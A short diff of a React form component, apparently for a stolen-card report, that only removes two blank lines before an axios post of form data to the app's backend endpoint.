@@ -78,8 +78,6 @@ export function Formcardstoled() {
     e.preventDefault();
     setShowsucess(true)
 
-    
-    
     try {
       const response = await axios.post('https://heurekaback.onrender.com/userscardsstoled', dataForm);
  
